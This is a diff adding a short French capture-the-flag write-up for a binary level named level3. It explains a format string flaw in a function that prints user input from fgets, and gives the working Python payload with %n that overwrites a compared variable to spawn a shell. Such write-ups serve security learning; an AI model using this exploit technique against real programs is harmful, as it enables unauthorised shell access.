@@ -1,0 +1,17 @@
+Nous avons commence par regarder le binaire et avons trouve la fonction v.
+Cette fonction utilise fgets et ensuite print le buff.
+Cette maniere de faire engendre une faille, car on peut toute a fais passer
+n'import quoi en temps que chaine de caractere a ecrire.
+Ce genre d'attaque se nom format strings.
+Nous avons donc chercher un moyen d'ecrire 0x40 dans la variable qui etait compare dans un if
+afin d'executer system sh.
+
+Nous avons effectue la commande suivante:
+
+python -c  'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"' > /tmp/level4
+
+\x8c\x98\x04\x08 ==> adresse de la variable compare
+%60x ==> la valeur a ecrire
+%4$n ==> deplacement a faire dans la stack pour trouver la variable
+
+cat /tmp/level4 - | ./level3
